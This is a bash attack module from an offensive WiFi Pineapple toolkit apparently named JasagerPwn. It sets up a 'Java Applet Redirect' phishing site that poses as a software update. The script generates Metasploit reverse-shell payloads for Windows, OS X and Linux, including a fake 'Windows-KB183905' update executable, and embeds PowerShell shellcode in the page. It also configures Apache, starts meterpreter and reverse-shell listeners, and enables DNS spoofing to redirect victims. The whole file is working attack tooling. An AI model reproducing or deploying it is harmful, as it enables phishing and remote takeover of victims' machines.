#
# Fake Update Attack Module
#
# Author: Leg3nd @ https://leg3nd.me
#

################ Module Configuration ##
# Module Title
title="Java Applet Redirect"
# Create a description for menu
description="Java Applet Redirect Phishing"
# Letter keys/commands to select item in menu
bindings="R|r"
#########################################

# Variables
javaapplet_www="/var/www/java-applet"

# Start Function
function start_javaapplet(){
  echo -e "\e[01;34m[>]\e[00m Running Java Applet Redirect Attack..."  
  
  # Clean up
  echo -e "\e[01;34m[>]\e[00m Setting up the Java website..."
  rm -rf "/var/www/javaapplet/*"
  if [ -e "src/web_templates/java-www/osx.bin" ]; then rm -f "src/web_templates/java-www/osx.bin"; fi
  if [ -e "src/web_templates/java-www/nix.bin" ]; then rm -f "src/web_templates/java-www/nix.bin"; fi
  if [ -e "src/web_templates/java-www/Windows-KB183905-x86-ENU.exe" ]; then rm -f "src/web_templates/java-www/Windows-KB183905-x86-ENU.exe"; fi

  # Copy over files to server location
  if [ ! -d "${javaapplet_www}" ]; then mkdir "$javaapplet_www" ; fi
  cp -rf src/web_templates/java-www/* "${javaapplet_www}"

  # Create our powershell payload
  echo -e "\e[01;34m[>]\e[00m Generating x86 and x64 PowerShell code..."  
  if [ -x "src/powershell_payload.py" ]; then chmod +x src/powershell_payload.py ; fi
  python src/powershell_payload.py "${our_ip}" "${ps_win_port}"
  x86="$(cat /tmp/x86.powershell.alnum)" 
  x64="$(cat /tmp/x64.powershell.alnum)"
  
  # Parse our index.html with the attacker data
  sed -i "s/REPLACEMEAPPLET/${our_ip}/g" "${javaapplet_www}/index.html"
  sed -i "s/86SHELLCODE/${x86}/g" "${javaapplet_www}/index.html"
  sed -i "s/64SHELLCODE/${x64}/g" "${javaapplet_www}/index.html"

  # Windows Payload choice 
  echo -e "\e[01;34m[>]\e[00m Generating binary payloads..."  
  if [ ! "${windows_payload}" ] || [ ! -e "${windows_payload}" ]; then
      echo -e "\e[01;34m[-]\e[00m Notice: Windows Payload was not found. Defaulting back to metasploit..."
      xterm -geometry 75x15+10+0 -bg black -fg green -T "[JasagerPwn] v${version} - Metasploit (Windows)" -e "msfpayload windows/meterpreter/reverse_tcp LHOST=${our_ip} LPORT=${win_port} R | msfencode -t exe -e x86/shikata_ga_nai -c 10 -o ${javaapplet_www}/Windows-KB183905-x86-ENU.exe"
  else
    cp -f "${windows_payload}" "${javaapplet_www}/Windows-KB183905-x86-ENU.exe"
  fi

  # Mac OSX Payload
  xterm -geometry 75x15+10+0 -bg black -fg green -T "[JasagerPwn] v${version} - Metasploit (OSX)" -e "msfpayload osx/x86/shell_reverse_tcp LPORT=${osx_port} LHOST=${our_ip} X > ${javaapplet_www}/osx.bin"
  # Linux Payload
  xterm -geometry 75x15+10+0 -bg black -fg green -T "[JasagerPwn] v${version} - Metasploit (Linux)" -e "msfpayload linux/x86/shell/reverse_tcp LPORT=${nix_port} LHOST=${our_ip} X  > ${javaapplet_www}/nix.bin"

  # Setup apache
  echo -e "\e[01;34m[>]\e[00m Setting up Apache server...." 
  echo "<VirtualHost *:80>
          ServerAdmin webmaster@localhost
          DocumentRoot ${javaapplet_www}
          <Directory />
                  Options FollowSymLinks
                  AllowOverride None
          </Directory>
          <Directory ${javaapplet_www}>
                  Options Indexes FollowSymLinks MultiViews
                  AllowOverride None
                  Order allow,deny
                  allow from all
          </Directory>
          ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
          <directory \"/usr/lib/cgi-bin\">
                  AllowOverride None
                  Options ExecCGI -MultiViews +SymLinksIfOwnerMatch
                  Order allow,deny
                  Allow from all
          </directory>
          ErrorDocument 403 /index.html
          ErrorDocument 404 /index.html
  </VirtualHost>
  " > /etc/apache2/sites-available/javaapplet
  
  chown -R www-data:www-data "${javaapplet_www}" 
  xterm -geometry 75x8+100+0 -T "[JasagerPwn] v${version} - Starting Apache2" -e "ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite javaapplet && a2enmod php5 && /etc/init.d/apache2 reload"
  service apache2 restart 1> /dev/null 2>/dev/null

  # Metasploit resource script
  echo -e "use exploit/multi/handler
  set PAYLOAD windows/meterpreter/reverse_https
  set EXITFUNC thread
  set LHOST 0.0.0.0
  set LPORT ${win_port}
  set SessionCommunicationTimeout 0
  set ExitOnSession false
  set AutoRunScript \"\"
  set InitialAutorunScript multiscript -rc /tmp/autorun.rc
  exploit -j
  set PAYLOAD generic/shell_reverse_tcp
  set LHOST 0.0.0.0
  set LPORT ${osx_port}
  set ExitOnSession false
  set InitialAutorunScript \"\"
  set AutoRunScript \"\"
  exploit -j
  set PAYLOAD linux/x86/shell/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT ${nix_port}
  set ExitOnSession false
  set InitialAutorunScript \"\"
  set AutoRunScript \"\"
  exploit -j
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT ${ps_win_port}
  set InitialAutorunScript \"\"
  set AutoRunScript migrate -f -k
  set ExitOnSession false
  exploit -j
  jobs -v" > /tmp/msfrc
  
  # Start our metasploit listener
  echo -e "\e[01;34m[>]\e[00m Starting metasploit listeners..."  
  terminator -e "msfconsole -r /tmp/msfrc" > /dev/null 2>&1 &
  
  # Set DNSspoof on the pineapple
  echo -e "\e[01;34m[>]\e[00m Enabling dnsspoof on the pineapple.."    
  command="mkdir /pineapple/config ; echo \"${our_ip} *\" > /pineapple/config/spoofhost"
  pineapple_command
  command="bash /pineapple/components/infusions/dnsspoof/includes/autostart.sh"
  pineapple_command
}

# Stop Function
function stop_javaapplet(){
  echo -e "\e[01;34m[>]\e[00m Stopping Fake Update Attack..."  
  command="killall -9 dnsspoof"
  pineapple_command
}
